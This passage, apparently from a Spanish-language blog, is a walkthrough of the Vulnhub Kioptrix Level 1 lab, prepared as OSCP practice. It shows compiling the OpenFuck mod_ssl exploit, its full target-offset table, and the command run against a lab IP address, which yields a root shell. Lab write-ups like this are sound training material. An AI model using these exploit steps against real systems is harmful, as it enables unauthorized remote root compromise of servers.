+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install libssl-dev</span></span></code></pre></div></div>
+<p>Compilamos</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -o OpenFuck OpenFuck.c -lcrypto</span></span></code></pre></div></div>
+<h3 id="explotacion">Explotacion</h3>
+<p>Ejecutamos el exploit</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./OpenFuck</span></span></code></pre></div></div>
+<p>Output</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./OpenFuck                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*******************************************************************
+</span></span><span class="line"><span class="cl">* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+</span></span><span class="line"><span class="cl">*******************************************************************
+</span></span><span class="line"><span class="cl">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+</span></span><span class="line"><span class="cl">* <span class="c1">#hackarena  irc.brasnet.org                                     *</span>
+</span></span><span class="line"><span class="cl">* TNX Xanthic USG <span class="c1">#SilverLords #BloodBR #isotk #highsecure #uname *</span>
+</span></span><span class="line"><span class="cl">* <span class="c1">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
+</span></span><span class="line"><span class="cl">* <span class="c1">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span>
+</span></span><span class="line"><span class="cl">*******************************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">: Usage: ./OpenFuckV2 target box <span class="o">[</span>port<span class="o">]</span> <span class="o">[</span>-c N<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  target - supported box eg: 0x00
+</span></span><span class="line"><span class="cl">  box - hostname or IP address
+</span></span><span class="line"><span class="cl">  port - port <span class="k">for</span> ssl connection
+</span></span><span class="line"><span class="cl">  -c open N connections. <span class="o">(</span>use range 40-50 <span class="k">if</span> u dont know<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Supported OffSet:
+</span></span><span class="line"><span class="cl">        0x00 - Caldera OpenLinux <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x01 - Cobalt Sun 6.0 <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x02 - Cobalt Sun 6.0 <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x03 - Cobalt Sun x <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x04 - Cobalt Sun x Fixed2 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x05 - Conectiva <span class="m">4</span> <span class="o">(</span>apache-1.3.6<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x06 - Conectiva 4.1 <span class="o">(</span>apache-1.3.9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x07 - Conectiva <span class="m">6</span> <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x08 - Conectiva <span class="m">7</span> <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x09 - Conectiva <span class="m">7</span> <span class="o">(</span>apache-1.3.19<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x0a - Conectiva 7/8 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x0b - Conectiva <span class="m">8</span> <span class="o">(</span>apache-1.3.22<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x0c - Debian GNU Linux 2.2 Potato <span class="o">(</span>apache_1.3.9-14.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x0d - Debian GNU Linux <span class="o">(</span>apache_1.3.19-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x0e - Debian GNU Linux <span class="o">(</span>apache_1.3.22-2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x0f - Debian GNU Linux <span class="o">(</span>apache-1.3.22-2.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x10 - Debian GNU Linux <span class="o">(</span>apache-1.3.22-5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x11 - Debian GNU Linux <span class="o">(</span>apache_1.3.23-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x12 - Debian GNU Linux <span class="o">(</span>apache_1.3.24-2.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x13 - Debian Linux GNU Linux <span class="m">2</span> <span class="o">(</span>apache_1.3.24-2.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x14 - Debian GNU Linux <span class="o">(</span>apache_1.3.24-3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x15 - Debian GNU Linux <span class="o">(</span>apache-1.3.26-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x16 - Debian GNU Linux 3.0 Woody <span class="o">(</span>apache-1.3.26-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x17 - Debian GNU Linux <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x18 - FreeBSD <span class="o">(</span>apache-1.3.9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x19 - FreeBSD <span class="o">(</span>apache-1.3.11<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x1a - FreeBSD <span class="o">(</span>apache-1.3.12.1.40<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x1b - FreeBSD <span class="o">(</span>apache-1.3.12.1.40<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x1c - FreeBSD <span class="o">(</span>apache-1.3.12.1.40<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x1d - FreeBSD <span class="o">(</span>apache-1.3.12.1.40_1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x1e - FreeBSD <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x1f - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x20 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x21 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x22 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x23 - FreeBSD <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x24 - FreeBSD <span class="o">(</span>apache-1.3.17_1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x25 - FreeBSD <span class="o">(</span>apache-1.3.19<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x26 - FreeBSD <span class="o">(</span>apache-1.3.19_1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x27 - FreeBSD <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x28 - FreeBSD <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x29 - FreeBSD <span class="o">(</span>apache-1.3.20+2.8.4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x2a - FreeBSD <span class="o">(</span>apache-1.3.20_1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x2b - FreeBSD <span class="o">(</span>apache-1.3.22<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x2c - FreeBSD <span class="o">(</span>apache-1.3.22_7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x2d - FreeBSD <span class="o">(</span>apache_fp-1.3.23<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x2e - FreeBSD <span class="o">(</span>apache-1.3.24_7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x2f - FreeBSD <span class="o">(</span>apache-1.3.24+2.8.8<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x30 - FreeBSD 4.6.2-Release-p6 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x31 - FreeBSD 4.6-Realease <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x32 - FreeBSD <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x33 - Gentoo Linux <span class="o">(</span>apache-1.3.24-r2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x34 - Linux Generic <span class="o">(</span>apache-1.3.14<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x35 - Mandrake Linux X.x <span class="o">(</span>apache-1.3.22-10.1mdk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x36 - Mandrake Linux 7.1 <span class="o">(</span>apache-1.3.14-2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x37 - Mandrake Linux 7.1 <span class="o">(</span>apache-1.3.22-1.4mdk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x38 - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.14-2mdk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x39 - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.14<span class="o">)</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x3a - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.20-5.1mdk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x3b - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.20-5.2mdk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x3c - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.22-1.3mdk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x3d - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.22-10.2mdk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x3e - Mandrake Linux 8.0 <span class="o">(</span>apache-1.3.19-3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x3f - Mandrake Linux 8.1 <span class="o">(</span>apache-1.3.20-3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x40 - Mandrake Linux 8.2 <span class="o">(</span>apache-1.3.23-4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x41 - Mandrake Linux 8.2 <span class="c1">#2 (apache-1.3.23-4)</span>
+</span></span><span class="line"><span class="cl">        0x42 - Mandrake Linux 8.2 <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x43 - Mandrake Linux <span class="m">9</span> <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x44 - RedHat Linux ?.? GENERIC <span class="o">(</span>apache-1.3.12-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x45 - RedHat Linux TEST1 <span class="o">(</span>apache-1.3.12-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x46 - RedHat Linux TEST2 <span class="o">(</span>apache-1.3.12-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x47 - RedHat Linux GENERIC <span class="o">(</span>marumbi<span class="o">)</span> <span class="o">(</span>apache-1.2.6-5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x48 - RedHat Linux 4.2 <span class="o">(</span>apache-1.1.3-3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x49 - RedHat Linux 5.0 <span class="o">(</span>apache-1.2.4-4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x4a - RedHat Linux 5.1-Update <span class="o">(</span>apache-1.2.6<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x4b - RedHat Linux 5.1 <span class="o">(</span>apache-1.2.6-4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x4c - RedHat Linux 5.2 <span class="o">(</span>apache-1.3.3-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x4d - RedHat Linux 5.2-Update <span class="o">(</span>apache-1.3.14-2.5.x<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x4e - RedHat Linux 6.0 <span class="o">(</span>apache-1.3.6-7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x4f - RedHat Linux 6.0 <span class="o">(</span>apache-1.3.6-7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x50 - RedHat Linux 6.0-Update <span class="o">(</span>apache-1.3.14-2.6.2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x51 - RedHat Linux 6.0 Update <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x52 - RedHat Linux 6.1 <span class="o">(</span>apache-1.3.9-4<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x53 - RedHat Linux 6.1 <span class="o">(</span>apache-1.3.9-4<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x54 - RedHat Linux 6.1-Update <span class="o">(</span>apache-1.3.14-2.6.2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x55 - RedHat Linux 6.1-fp2000 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x56 - RedHat Linux 6.2 <span class="o">(</span>apache-1.3.12-2<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x57 - RedHat Linux 6.2 <span class="o">(</span>apache-1.3.12-2<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x58 - RedHat Linux 6.2 mod<span class="o">(</span>apache-1.3.12-2<span class="o">)</span><span class="m">3</span>
+</span></span><span class="line"><span class="cl">        0x59 - RedHat Linux 6.2 update <span class="o">(</span>apache-1.3.22-5.6<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x5a - RedHat Linux 6.2-Update <span class="o">(</span>apache-1.3.22-5.6<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x5b - Redhat Linux 7.x <span class="o">(</span>apache-1.3.22<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x5c - RedHat Linux 7.x <span class="o">(</span>apache-1.3.26-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x5d - RedHat Linux 7.x <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x5e - RedHat Linux 7.0 <span class="o">(</span>apache-1.3.12-25<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x5f - RedHat Linux 7.0 <span class="o">(</span>apache-1.3.12-25<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x60 - RedHat Linux 7.0 <span class="o">(</span>apache-1.3.14-2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x61 - RedHat Linux 7.0-Update <span class="o">(</span>apache-1.3.22-5.7.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x62 - RedHat Linux 7.0-7.1 update <span class="o">(</span>apache-1.3.22-5.7.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x63 - RedHat Linux 7.0-Update <span class="o">(</span>apache-1.3.27-1.7.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x64 - RedHat Linux 7.1 <span class="o">(</span>apache-1.3.19-5<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x65 - RedHat Linux 7.1 <span class="o">(</span>apache-1.3.19-5<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x66 - RedHat Linux 7.1-7.0 update <span class="o">(</span>apache-1.3.22-5.7.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x67 - RedHat Linux 7.1-Update <span class="o">(</span>1.3.22-5.7.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x68 - RedHat Linux 7.1 <span class="o">(</span>apache-1.3.22-src<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x69 - RedHat Linux 7.1-Update <span class="o">(</span>1.3.27-1.7.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x6a - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.20-16<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x6b - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.20-16<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x6c - RedHat Linux 7.2-Update <span class="o">(</span>apache-1.3.22-6<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x6d - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x6e - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x6f - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.26-snc<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x70 - Redhat Linux 7.2 <span class="o">(</span>apache-1.3.26 w/PHP<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x71 - Redhat Linux 7.2 <span class="o">(</span>apache-1.3.26 w/PHP<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x72 - RedHat Linux 7.2-Update <span class="o">(</span>apache-1.3.27-1.7.2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x73 - RedHat Linux 7.3 <span class="o">(</span>apache-1.3.23-11<span class="o">)</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        0x74 - RedHat Linux 7.3 <span class="o">(</span>apache-1.3.23-11<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x75 - RedHat Linux 7.3 <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x76 - RedHat Linux 8.0 <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x77 - RedHat Linux 8.0-second <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x78 - RedHat Linux 8.0 <span class="o">(</span>apache-2.0.40<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x79 - Slackware Linux 4.0 <span class="o">(</span>apache-1.3.6<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x7a - Slackware Linux 7.0 <span class="o">(</span>apache-1.3.9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x7b - Slackware Linux 7.0 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x7c - Slackware 7.0  <span class="o">(</span>apache-1.3.26<span class="o">)</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">        0x7d - Slackware Linux 7.1 <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x7e - Slackware Linux 8.0 <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x7f - Slackware Linux 8.1 <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x80 - Slackware Linux 8.1 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x81 - Slackware Linux 8.1-stable <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x82 - Slackware Linux <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x83 - SuSE Linux 7.0 <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x84 - SuSE Linux 7.1 <span class="o">(</span>apache-1.3.17<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x85 - SuSE Linux 7.2 <span class="o">(</span>apache-1.3.19<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x86 - SuSE Linux 7.3 <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x87 - SuSE Linux 8.0 <span class="o">(</span>apache-1.3.23<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x88 - SUSE Linux 8.0 <span class="o">(</span>apache-1.3.23-120<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x89 - SuSE Linux 8.0 <span class="o">(</span>apache-1.3.23-137<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        0x8a - Yellow Dog Linux/PPC 2.3 <span class="o">(</span>apache-1.3.22-6.2.3a<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Fuck to all guys who like use lamah ddos. Read SRC to have no surprise</span></span></code></pre></div></div>
+<p>Como podemos ver hay diferentes versiones de apache para diferentes versiones de Gnu/linux tras unos intentos comprobamos que la opción correcta es 0x6b</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./openfuck 0x6b 192.168.66.158 -c <span class="m">45</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled%207.png"
+        data-srcset="/kioptrix_level_1/Untitled%207.png, /kioptrix_level_1/Untitled%207.png 1.5x, /kioptrix_level_1/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled%207.png"
+        title="Untitled" width="702" height="635" /></p>
+<p>Obtenemos una Shell con permisos root por lo que no es necesario escalar privilegios.</p>
+<p>Con esto terminamos la maquina.</p>
+<p>Un saludo y Feliz Hacking.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Actualizado el 2023-08-14</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/kioptrix_level_1/index.md" target="_blank">Leer Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Compartir en X" data-sharer="x" data-url="http://localhost:1313/kioptrix_level_1/" data-title="Kioptrix Level 1 Walkthrough" data-hashtags="Walkthrough,Vulnhub,TjNull,OSCP,Easy"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Threads" data-sharer="threads" data-url="http://localhost:1313/kioptrix_level_1/" data-title="Kioptrix Level 1 Walkthrough"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Facebook" data-sharer="facebook" data-url="http://localhost:1313/kioptrix_level_1/" data-hashtag="Walkthrough"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/kioptrix_level_1/"><i class="fab fa-linkedin" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/kioptrix_level_1/" data-title="Kioptrix Level 1 Walkthrough"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Line" data-sharer="line" data-url="http://localhost:1313/kioptrix_level_1/" data-title="Kioptrix Level 1 Walkthrough"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en 微博" data-sharer="weibo" data-url="http://localhost:1313/kioptrix_level_1/" data-title="Kioptrix Level 1 Walkthrough"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/kioptrix_level_1/" data-title="Kioptrix Level 1 Walkthrough" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fkioptrix_level_1%2f&amp;text=Kioptrix%20Level%201%20Walkthrough" target="_blank" title="Compartir en Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/walkthrough/">Walkthrough</a>,&nbsp;<a href="/tags/vulnhub/">Vulnhub</a>,&nbsp;<a href="/tags/tjnull/">TjNull</a>,&nbsp;<a href="/tags/oscp/">OSCP</a>,&nbsp;<a href="/tags/easy/">Easy</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Regresar</a></span>&nbsp;|&nbsp;<span><a href="/">Inicio</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/kioptrix_level_2/" class="next" rel="next" title="Kioptrix Level 2 Walkthrough">Kioptrix Level 2 Walkthrough<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Con la tecnología de <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.157.0">Hugo</a> | Tema - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">AnTuSec</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Volver arriba">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Ver comentarios">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.es.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"es","maxResultLength":10,"noResultsFound":"No se encontraron resultados","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
